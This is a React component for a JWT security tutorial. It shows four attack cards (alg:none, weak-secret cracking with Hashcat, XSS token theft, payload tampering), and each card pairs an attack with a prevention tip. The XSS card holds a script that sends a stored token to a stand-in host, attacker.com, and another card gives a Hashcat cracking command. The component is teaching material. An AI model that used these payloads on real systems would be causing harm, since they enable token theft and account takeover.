import { useState } from "react";

const attacks = [
  {
    id: "alg-none",
    icon: "🚫",
    label: "alg: none Exploit",
    color: "var(--error)",
    colorBg: "rgba(248,113,113,0.08)",
    colorBorder: "rgba(248,113,113,0.25)",
    severity: "Critical",
    summary: 'Strip the signature entirely by setting the algorithm to "none". Some libraries accept this and skip verification.',
    detail: 'An attacker modifies the header to set "alg": "none", then removes the signature. Vulnerable JWT libraries treat a missing signature as valid — granting access without any authentication.',
    code: `// Original header
{ "alg": "HS256", "typ": "JWT" }

// ☠ Attacker changes header to:
{ "alg": "none", "typ": "JWT" }

// Then removes the signature:
eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
// ↑ Empty signature — some servers accept this!`,
    fix: 'Always explicitly whitelist allowed algorithms. Reject "alg: none". Use a maintained JWT library with secure defaults (e.g., never accept an unsigned token).',
  },
  {
    id: "weak-secret",
    icon: "🔓",
    label: "Weak Secret / Brute Force",
    color: "var(--warning)",
    colorBg: "rgba(251,191,36,0.08)",
    colorBorder: "rgba(251,191,36,0.25)",
    severity: "High",
    summary: "Short or predictable secrets can be cracked offline in milliseconds — the attacker only needs the public token.",
    detail: "Because HS256 is symmetric, an attacker who captures a valid token can brute-force the secret entirely offline. Tools like Hashcat can try millions of candidates per second against captured JWTs.",
    code: `# Attacker captures a token and brute-forces:
hashcat -a 0 -m 16500 captured.jwt wordlist.txt

# Common weak secrets cracked instantly:
"secret"    "password"    "123456"
"jwt_secret"    "mysecret"    "token"

# Result: attacker can sign any payload they want`,
    fix: "Use a cryptographically random secret of at least 256 bits (32 bytes). Consider RS256 — the private key never leaves your server, making offline brute-force impossible.",
  },
  {
    id: "xss-theft",
    icon: "🎣",
    label: "Token Theft via XSS",
    color: "#f97316",
    colorBg: "rgba(249,115,22,0.08)",
    colorBorder: "rgba(249,115,22,0.25)",
    severity: "High",
    summary: "JWTs stored in localStorage or sessionStorage are fully accessible to any JavaScript on the page — including injected scripts.",
    detail: "Cross-Site Scripting lets attackers inject malicious scripts. Any token in Web Storage is visible to all JS running on the domain — including third-party ads, analytics, and injected code.",
    code: `// Attacker injects a script (via comment, user input, etc.)
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('token'),
      url: location.href
    })
  });
</script>
// Victim visits page → token silently exfiltrated`,
    fix: "Store tokens in HttpOnly cookies — invisible to JavaScript entirely. Add SameSite=Strict and Secure flags. Implement a strong Content Security Policy (CSP) to block injected scripts.",
  },
  {
    id: "payload-tamper",
    icon: "✏️",
    label: "Payload Tampering",
    color: "var(--token-payload)",
    colorBg: "rgba(192,132,252,0.08)",
    colorBorder: "rgba(192,132,252,0.25)",
    severity: "Medium",
    summary: "The payload is only Base64URL encoded, not encrypted. Anyone can read it — and attempt to modify it.",
    detail: 'The payload is publicly readable. While a valid server rejects tampered tokens (signature mismatch), servers that skip verification or trust unverified claims are wide open to privilege escalation.',
    code: `// Decode the payload (visible to anyone):
{ "sub": "user_123", "role": "user" }

// Attacker edits to escalate privileges:
{ "sub": "user_123", "role": "admin" }

// Re-encodes and replaces in the token:
header.[TAMPERED_PAYLOAD].[ORIGINAL_SIG]

// ✅ Proper server → verification fails → 401
// ☠ Broken server → no verification → admin access!`,
    fix: "Always verify the signature before reading any claims. Never decode a JWT without verifying it first. Never store sensitive secrets in the payload — it is not encrypted.",
  },
];

export default function AttacksSection() {
  const [active, setActive] = useState(0);
  const atk = attacks[active];

  return (
    <div className="attacks">
      <div className="attacks__nav">
        {attacks.map((a, i) => (
          <button
            key={a.id}
            className={`attacks__nav-btn ${i === active ? "attacks__nav-btn--active" : ""}`}
            onClick={() => setActive(i)}
            style={i === active ? { borderColor: a.colorBorder, background: a.colorBg } : {}}
          >
            <span className="attacks__nav-icon">{a.icon}</span>
            <span className="attacks__nav-label">{a.label}</span>
            <span
              className="attacks__severity"
              style={i === active ? { background: a.colorBg, color: a.color, borderColor: a.colorBorder } : {}}
            >
              {a.severity}
            </span>
          </button>
        ))}
      </div>

      <div className="attacks__body glow-card" style={{ borderColor: atk.colorBorder }}>
        <div className="attacks__body-header">
          <span className="attacks__big-icon">{atk.icon}</span>
          <div>
            <h3 className="attacks__title" style={{ color: atk.color }}>{atk.label}</h3>
            <p className="attacks__summary">{atk.summary}</p>
          </div>
        </div>

        <div className="attacks__detail">
          <p>{atk.detail}</p>
        </div>

        <div className="attacks__code-wrap">
          <div className="attacks__code-header">
            <span className="attacks__code-label" style={{ color: atk.color }}>⚠ Attack Vector</span>
            <div className="attacks__code-dots">
              <span style={{ background: '#f87171' }} />
              <span style={{ background: '#fbbf24' }} />
              <span style={{ background: '#34d399' }} />
            </div>
          </div>
          <pre className="attacks__code">{atk.code}</pre>
        </div>

        <div className="attacks__fix" style={{ borderColor: `rgba(52,211,153,0.2)`, background: 'rgba(52,211,153,0.05)' }}>
          <div className="attacks__fix-label">
            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="var(--success)" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
            Prevention
          </div>
          <p className="attacks__fix-text">{atk.fix}</p>
        </div>
      </div>
    </div>
  );
}
